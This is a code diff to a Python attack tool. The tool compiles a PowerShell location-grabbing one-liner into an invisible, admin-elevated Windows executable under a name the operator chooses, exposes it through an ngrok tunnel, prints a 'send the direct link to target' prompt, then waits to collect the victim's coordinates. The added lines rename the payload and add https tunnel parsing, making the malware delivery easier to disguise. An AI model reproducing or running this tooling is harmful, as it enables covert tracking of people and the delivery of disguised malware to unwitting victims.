@@ -1,4 +1,4 @@
-from os import system, path
+from os import system, path, rename
 import shutil
 from time import sleep
 import re
@@ -39,7 +39,10 @@ def checkNgrok():
         system('clear')
 checkNgrok()
 
+system('rm *.exe')
 system('cp Template/get-location-oneliner.ps1 ./ > /dev/null')
+system('cp Template/Ps1_To_Exe_x64.exe ./ > /dev/null')
+system('cp Template/Ps1_To_Exe.exe ./ > /dev/null')
 system("rm location.loc 2> /dev/null")
 system("touch location.loc")
 
@@ -55,7 +58,7 @@ def ngrok():
     system("./ngrok http 8080 > /dev/null &")
     
     sleep(6)
-    system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "http://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
+    system('curl -s -N http://127.0.0.1:4040/api/tunnels | grep "https://[0-9a-z]*\.ngrok.io" -oh > ngrok.url')
     urlFile = open('ngrok.url', 'r')
     global url
     url = urlFile.read().rstrip("\n")
@@ -74,19 +77,25 @@ def subst():
 
 
 def compile():
-    cmp = input(" [+] Windows system type you want to compile for x86/x64: ")
+    cmp = input(" [+] Windows system type you want to compile for x86/x64: ")    
     if cmp == 'x64':
+        global payload
+        payload = input(" [+] Payload name without extension: ")
         print(GREEN + " [+] Compiling to exe" + DEFAULT)
-        system("wine Ps1_To_Exe_x64.exe /ps1 get-location-oneliner.ps1 /exe location.exe /x64 /invisible /uac-admin")
-        print(CYAN + " [+] Output file location.exe generated" + DEFAULT)
+        system("wine64 Ps1_To_Exe_x64.exe /ps1 get-location-oneliner.ps1 /exe location.exe /x64 /invisible /uac-admin")
+        rename("location.exe", payload + ".exe")
+        print(CYAN + " [+] Output file " + payload + ".exe" + " generated" + DEFAULT)
     elif cmp == 'x86':
+        payload = input(" [+] Payload name without extension: ")
         print(GREEN + " [+] Compiling to exe" + DEFAULT)
-        system("wine Ps1_To_Exe.exe /ps1 get-location-oneliner.ps1 /exe location.exe /invisible /uac-admin")
-        print(CYAN + " [+] Output file location.exe generated" + DEFAULT)
+        system("wine64 Ps1_To_Exe.exe /ps1 get-location-oneliner.ps1 /exe location.exe /invisible /uac-admin")
+        rename("location.exe", payload + ".exe")
+        print(CYAN + " [+] Output file " + payload + ".exe" + " generated" + DEFAULT)
     else:
         compile()    
 
 def getcords():
+    print(GREEN + "\n [+] Send the direct link to target " + DEFAULT + CYAN + url + "/" + payload + ".exe" + DEFAULT)
     print(GREEN + "\n [+] Waiting for location"+ DEFAULT)
     while True:
         
